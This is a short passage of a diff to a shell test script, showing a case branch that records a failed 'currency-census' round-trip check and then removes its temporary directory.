+    *) record_fail "currency-census: (k5) vai-e-volta da base" "2ª='${r2:0:80}' 3ª='${r3:0:80}'" ;; esac
   rm -rf "${d}"
 }
 
